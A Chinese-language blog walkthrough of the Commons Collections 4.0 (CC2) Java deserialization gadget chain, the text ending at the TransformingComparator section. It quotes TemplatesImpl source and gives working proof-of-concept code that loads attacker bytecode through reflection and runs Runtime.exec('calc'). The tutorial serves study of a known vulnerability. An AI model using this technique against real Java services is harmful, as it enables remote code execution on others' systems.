+ <h1 id="table-of-contents">目录</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-text">类加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%B1%BB%E5%8A%A0%E8%BD%BD%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">利用类加载代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl-defineClass"><span class="toc-text">TemplatesImpl.defineClass()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl-defineTransletClasses"><span class="toc-text">TemplatesImpl.defineTransletClasses()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl-getTransletInstance"><span class="toc-text">TemplatesImpl.getTransletInstance()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl-newTransformer"><span class="toc-text">TemplatesImpl.newTransformer()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TransformingComparator-compare"><span class="toc-text">TransformingComparator.compare()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PriorityQueue"><span class="toc-text">PriorityQueue</span></a></li></ol>
+
+<p><strong>漏洞环境：</strong></p>
+<p>java：<a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">Java SE 8 Development Kit 8u65</a></p>
+<p>commons-collections：4.0</p>
+<p>gradle：implementation group: ‘org.apache.commons’, name: ‘commons-collections4’, version: ‘4.0’</p>
+<p><strong>Gadget chain：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">		PriorityQueue.readObject()</span><br><span class="line">		PriorityQueue.heapify()</span><br><span class="line">		PriorityQueue.siftDown()</span><br><span class="line">		PriorityQueue.siftDownUsingComparator()</span><br><span class="line">			TransformingComparator.compare()</span><br><span class="line">				InvokerTransformer.transform()</span><br><span class="line">        			TemplatesImpl.newTransformer()</span><br><span class="line">        			TemplatesImpl.getTransletInstance()</span><br><span class="line">        			TemplatesImpl.defineTransletClasses()</span><br><span class="line">        			TemplatesImpl.defineClass()<span class="comment">//将 byte 字节解析成虚拟机能够识别的Class对象。</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h3><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1vJ41177cw?p=2">java类加载</a></p>
+<p><strong>类的加载连接和初始化</strong></p>
+<p>当 Java程序中需要使用到某个类时，虚拟机会保证这个类已经被加载、连接和初始化。而连接又包含验证、准备和解析这三个子过程，这个过程必须严格按照顺序执行。</p>
+<p><strong>类的加载</strong></p>
+<p>通过类的完全限定名（包名和类名）查找此类的字节码文件，把类的.class文件中的二进制数据读入到内存中，并存放在运行时数据区的方法区内，然后利用字节码文件创建一个Class对象，用来封装类在方法区内的数据结构并存放在堆区内。这个过程是由类加载器完成的，我们后面会进行详细讲解。</p>
+<p><strong>连接</strong></p>
+<ul>
+<li><p>验证：确保被加载类的正确性。class 文件的字节流中包含的信息符合当前虚拟机要求，不会危害虚拟机自身的安全。</p>
+</li>
+<li><p>准备：为类的静态变量分配内存，并将其设置为默认值。此阶段仅仅只为静态类变量（即 static 修饰的字段变量）分配内存，并且设置该变量的初始值。（比如 static int num = 5，这里只将 num 初始化为0，5的值将会在初始化时赋值）。对于 final static 修饰的变量，编译的时候就会分配了，也不会分配实例变量的内存。</p>
+</li>
+<li><p>解析：把类中的符号引用转换为直接引用。符号引用就是一组符号来描述目标，而直接引用就是直接指向目标的指针。相对偏移量或一个间接定位到目标的句柄。（可参考”虚拟机指令”相关内容）</p>
+</li>
+</ul>
+<p><strong>初始化</strong></p>
+<p>类加载最后阶段，若该类具有父类，则先对父类进行初始化，执行静态变量赋值和静态代码块代码，成员变量也将被初始化。</p>
+<h3 id="利用类加载代码执行"><a href="#利用类加载代码执行" class="headerlink" title="利用类加载代码执行"></a>利用类加载代码执行</h3><p>类加载器（除了根类加载器）都必须继承java.lang.ClassLoader。ClassLoader下有一个defineClass方法，它是将 byte 字节解析成虚拟机能够识别的Class对象。</p>
+<p><strong>TransletClassLoader</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title">Templates</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">             TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">                 <span class="keyword">super</span>(parent);</span><br><span class="line">                _loadedExternalExtensionFunctions = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">                <span class="keyword">super</span>(parent);</span><br><span class="line">                _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">                Class&lt;?&gt; ret = <span class="keyword">null</span>;</span><br><span class="line">                <span class="comment">// The _loadedExternalExtensionFunctions will be empty when the</span></span><br><span class="line">                <span class="comment">// SecurityManager is not set and the FSP is turned off</span></span><br><span class="line">                <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (ret == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    ret = <span class="keyword">super</span>.loadClass(name);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="function">Class <span class="title">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="TemplatesImpl-defineClass"><a href="#TemplatesImpl-defineClass" class="headerlink" title="TemplatesImpl.defineClass()"></a>TemplatesImpl.defineClass()</h4><p>在TemplatesImpl类中自定义了类加载器，并且定义了defineClass方法接收byte字节数组，返回ClassLoader.defineClass方法解析成的class对象，如果byte字节数组b我们可以控制那我们就可以返回任意类的class对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Class <span class="title">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="TemplatesImpl-defineTransletClasses"><a href="#TemplatesImpl-defineTransletClasses" class="headerlink" title="TemplatesImpl.defineTransletClasses()"></a>TemplatesImpl.defineTransletClasses()</h4><p>在TemplatesImpl.defineTransletClasses()方法中调用了defineClass方法，其中_tfactory不能等于null，才能顺利到loader.defineClass(_bytecodes[i]);  _tfactory被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值，他并不会影像我们的Gadget chain执行到loader.defineClass，loader.defineClass它传递一个_ bytecodes二维数组将class对象返回给_class数组，_bytecodes二维数组是私有属性，我们可以通过反射赋值，那么我们就找哪里调用了defineTransletClasses方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> TransformerFactoryImpl _tfactory = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[][] _bytecodes = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">private</span> Class[] _class = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span>  <span class="title">readObject</span><span class="params">(ObjectInputStream is)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        SecurityManager security = System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="keyword">null</span>)&#123;</span><br><span class="line">            String temp = SecuritySupport.getSystemProperty(DESERIALIZE_TRANSLET);</span><br><span class="line">            <span class="keyword">if</span> (temp == <span class="keyword">null</span> || !(temp.length()==<span class="number">0</span> || temp.equalsIgnoreCase(<span class="string">&quot;true&quot;</span>))) &#123;</span><br><span class="line">                ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.DESERIALIZE_TRANSLET_ERR);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// We have to read serialized fields first.</span></span><br><span class="line">        ObjectInputStream.GetField gf = is.readFields();</span><br><span class="line">        _name = (String)gf.get(<span class="string">&quot;_name&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        _bytecodes = (<span class="keyword">byte</span>[][])gf.get(<span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        _class = (Class[])gf.get(<span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        _transletIndex = gf.get(<span class="string">&quot;_transletIndex&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        _outputProperties = (Properties)gf.get(<span class="string">&quot;_outputProperties&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        _indentNumber = gf.get(<span class="string">&quot;_indentNumber&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is.readBoolean()) &#123;</span><br><span class="line">            _uriResolver = (URIResolver) is.readObject();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _tfactory = <span class="keyword">new</span> TransformerFactoryImpl();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="TemplatesImpl-getTransletInstance"><a href="#TemplatesImpl-getTransletInstance" class="headerlink" title="TemplatesImpl.getTransletInstance()"></a>TemplatesImpl.getTransletInstance()</h4><p>getTransletInstance方法调用了defineTransletClasses方法，_name不等于null， _class等于null就会调用defineTransletClasses方法，newInstance创建一个实例化对象，创建实例化对象，这个过程会执行静态变量赋值和静态代码块代码，如果我们传递的byte字节数组静态代码块中有恶意代码那么在创建实例化对象时就会执行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">            translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">            translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">            <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="TemplatesImpl-newTransformer"><a href="#TemplatesImpl-newTransformer" class="headerlink" title="TemplatesImpl.newTransformer()"></a>TemplatesImpl.newTransformer()</h4><p>在newTransformer方法中调用了getTransletInstance方法，并且newTransformer方法是public。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">            transformer.setURIResolver(_uriResolver);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">            transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> transformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>当我们通过反射将_ bytecodes二维数组赋值为含有恶意代码的类的byte字节，调用newTransformer方法就会触发恶意代码。</p>
+<p>CodeImplement：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CodeImplement</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>类加载代码执行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取一个TemplatesImpl对象</span></span><br><span class="line">      TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">      <span class="comment">//读取恶意代码的字节码</span></span><br><span class="line">      <span class="keyword">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;</span>));</span><br><span class="line">      <span class="comment">//将字节码数组存放在二维数组中</span></span><br><span class="line">      <span class="keyword">byte</span>[][] _bytecodes = &#123;code&#125;;</span><br><span class="line">      <span class="comment">//获取TemplatesImpl的Class对象</span></span><br><span class="line">      Class c = templates.getClass();</span><br><span class="line">      <span class="comment">//获取_name属性</span></span><br><span class="line">      Field name = c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">      name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      <span class="comment">//将_name设置为任意</span></span><br><span class="line">      name.set(templates,<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">      <span class="comment">//获取_bytecodes属性</span></span><br><span class="line">      Field bytecodes = c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">      bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      <span class="comment">//将存放恶意代码字节码的二维数组传递给_bytecodes属性</span></span><br><span class="line">      bytecodes.set(templates,_bytecodes);</span><br><span class="line">      <span class="comment">//获取_tfactory属性，这里只是为了演示所以手动加上这个属性，它被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值。</span></span><br><span class="line">      Field tfactory = c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">      tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">      templates.newTransformer();</span><br></pre></td></tr></table></figure>
+
+<p>代码执行：</p>
+<p><img src="image-20220101161822156.png" alt="image-20220101161822156"></p>
+<p>发生报错，调试查看发现他会判断解析的对象的父类是不是ABSTRACT_TRANSLET常量，是的话就会把i赋值给_transletIndex，_transletIndex，默认等于-1，_transletIndex小于0就会报错，所以我们需要把存在恶意代码的类继承com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet就能解决。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String ABSTRACT_TRANSLET = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> _transletIndex = -<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220101162158209.png" alt="image-20220101162158209"></p>
+<p>CodeImplement：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">public class CodeImplement extends AbstractTranslet&#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译成class文件，重写执行。</p>
+<p><img src="image-20220101163117299.png" alt="image-20220101163117299"></p>
+<h3 id="TransformingComparator-compare"><a href="#TransformingComparator-compare" class="headerlink" title="TransformingComparator.compare()"></a>TransformingComparator.compare()</h3><p>执行类与cc1一样InvokerTransformer.transform()，只不过调用的是TemplatesImpl类newTransformer方法，这里我们就直接看TransformingComparator类的compare方法。</p>
